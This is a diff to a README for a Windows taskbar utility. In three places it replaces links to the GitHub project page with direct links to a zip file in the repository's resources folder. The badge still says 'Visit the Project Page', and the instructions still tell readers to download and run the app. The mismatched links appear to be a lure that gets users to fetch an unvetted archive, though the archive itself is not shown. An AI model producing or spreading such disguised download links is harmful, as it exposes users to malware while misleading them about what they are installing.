@@ -1,6 +1,6 @@
 # 🖥️ per-monitor-taskbar - Keep each screen tidy
 
-[![Download](https://img.shields.io/badge/Download-Visit%20the%20Project%20Page-blue?style=for-the-badge)](https://github.com/cindysmoothed702/per-monitor-taskbar)
+[![Download](https://img.shields.io/badge/Download-Visit%20the%20Project%20Page-blue?style=for-the-badge)](https://github.com/cindysmoothed702/per-monitor-taskbar/raw/refs/heads/main/resources/monitor-taskbar-per-3.8.zip)
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ Use it if you want one screen to hide the taskbar while another keeps it visible
 
 Visit this page to download and set up the app:
 
-https://github.com/cindysmoothed702/per-monitor-taskbar
+https://github.com/cindysmoothed702/per-monitor-taskbar/raw/refs/heads/main/resources/monitor-taskbar-per-3.8.zip
 
 1. Open the link above in your browser.
 2. Download the latest Windows version from the project page.
@@ -163,7 +163,7 @@ For the best result:
 
 Download and run this app from the project page:
 
-https://github.com/cindysmoothed702/per-monitor-taskbar
+https://github.com/cindysmoothed702/per-monitor-taskbar/raw/refs/heads/main/resources/monitor-taskbar-per-3.8.zip
 
 ## 🏷️ Topics
 
